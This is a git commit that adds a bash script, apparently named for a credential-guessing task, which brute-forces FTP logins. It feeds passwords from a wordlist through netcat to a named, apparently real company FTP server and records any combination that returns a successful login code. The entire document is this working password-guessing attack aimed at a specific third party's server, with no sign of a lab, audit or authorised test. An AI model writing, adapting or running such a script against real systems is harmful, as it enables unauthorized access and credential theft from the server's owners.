e007a87c5fea8d59a96e58f2b35529f69b21e08c
Gabriel Resende Salles <gabriel.salles@aeon.com.br>
2020-04-30 23:03:13 -0300

    Atualização inicial

---
+++ cam.sh
@@ -0,0 +1,38 @@
+#!/usr/bin/env bash
+
+clear
+
+### VARIAVEIS
+
+usuario="agmlogistica"
+server="ftp.agmlogistica.com.br"
+porta="21"
+wordl="agmlogistica"
+
+### FUNÇÕES
+
+martelada(){
+
+codigo=$(cat <<EOF | nc $server $porta | tail -2 | head -1 | cut -d" " -f1
+user $usuario
+pass $senha
+quit
+EOF
+)
+echo "user[$usuario]pass[$senha]code[$codigo]"
+}
+
+[[ "$1" == "-r" ]]&&cat "$2" &&exit 0
+
+while $senha -z ;do
+
+	if [[ $codigo == "230" ]];then
+		echo "user[$usuario]pass[$senha]code[$codigo]" >> results/$wordl
+		exit 0
+	fi
+
+
+	linha=$(($linha + 1))
+	senha=$(cat words/$wordl | head -$linha  | tail -1)
+	martelada
+done
